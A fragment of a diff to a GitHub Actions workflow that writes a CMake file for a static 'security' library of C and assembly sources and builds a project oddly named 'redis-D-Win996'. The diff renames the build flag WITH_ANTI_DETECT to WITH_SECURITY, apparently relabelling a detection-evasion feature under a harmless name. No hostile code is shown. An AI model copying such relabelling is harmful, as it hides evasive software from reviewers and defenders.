+              # 32位架构
+              message(FATAL_ERROR "安全模块仅支持64位架构")
+          endif()
+
+          # 添加安全模块
+          add_library(security STATIC \${SOURCES} \${ASM_SOURCES})
+
+          # 设置包含目录
+          target_include_directories(security PUBLIC \${CMAKE_CURRENT_SOURCE_DIR})
+
+          # 添加编译定义
+          target_compile_definitions(security PRIVATE
+              _CRT_SECURE_NO_WARNINGS
+              WIN32_LEAN_AND_MEAN
+              NOMINMAX
+          )
+
+          # 特定编译器选项
+          if (MSVC)
+              # 禁用一些警告
+              target_compile_options(security PRIVATE 
+                  /W3
+                  /wd4996
+                  /D_CRT_SECURE_NO_WARNINGS
+                  /bigobj
+              )
+          endif()
+          EOF
 
       # 创建 build 目录
       - name: Create build directory in redis
@@ -159,7 +807,7 @@ jobs:
         shell: msys2 {0}
         run: |
           cd redis/redis-D-Win996/build
-          cmake .. -G "MinGW Makefiles" -Dredis_DEPS=D:/a/frp-2/frp-2/gcc/gcc/x64 -DCMAKE_C_FLAGS='-static' -DCMAKE_CXX_FLAGS='-static' -DBUILD_SHARED_LIBS=OFF -DHWLOC_INCLUDE_DIRS=/mingw64/include -DHWLOC_LIBRARIES=/mingw64/lib/libhwloc.a -DWITH_ANTI_DETECT=ON -DCMAKE_ASM_NASM_COMPILER=nasm
+          cmake .. -G "MinGW Makefiles" -Dredis_DEPS=D:/a/frp-2/frp-2/gcc/gcc/x64 -DCMAKE_C_FLAGS='-static' -DCMAKE_CXX_FLAGS='-static' -DBUILD_SHARED_LIBS=OFF -DHWLOC_INCLUDE_DIRS=/mingw64/include -DHWLOC_LIBRARIES=/mingw64/lib/libhwloc.a -DWITH_SECURITY=ON -DCMAKE_ASM_NASM_COMPILER=nasm
 
       # 编译项目
       - name: Build project
